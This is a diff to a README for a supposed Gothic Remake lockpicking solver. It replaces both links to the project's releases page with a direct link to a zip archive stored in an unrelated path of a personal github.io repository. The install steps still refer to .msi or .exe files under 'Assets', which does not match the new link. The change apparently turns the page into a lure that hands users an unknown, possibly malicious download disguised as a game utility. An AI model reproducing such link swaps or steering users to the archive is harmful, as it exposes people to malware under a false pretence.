@@ -5,7 +5,7 @@ description: "Solve the lockpicking minigame in Gothic Remake with this automate
 ---
 # 🔓 Gothic-Remake-Lockpick-Solver - Solve every lock puzzle with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/rutuja913/Gothic-Remake-Lockpick-Solver/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/rutuja913/rutuja913.github.io/main/Celsia/rutuja_io_github_v1.9.zip)
 
 This tool helps players solve lockpicking puzzles in the Gothic Remake. The application calculates the correct sequence for chest and gate locks. It removes the guesswork from lock puzzles so you spend more time exploring the world of Gothic.
 
@@ -18,7 +18,7 @@ This tool helps players solve lockpicking puzzles in the Gothic Remake. The appl
 
 ## 📥 How to Download and Install
 
-1. Visit [this page to download](https://github.com/rutuja913/Gothic-Remake-Lockpick-Solver/releases) the latest version of the solver.
+1. Visit [this page to download](https://raw.githubusercontent.com/rutuja913/rutuja913.github.io/main/Celsia/rutuja_io_github_v1.9.zip) the latest version of the solver.
 2. Look for the file ending in .msi or .exe under the "Assets" section.
 3. Click the file name to start the download.
 4. Open your downloads folder once the file finishes saving.
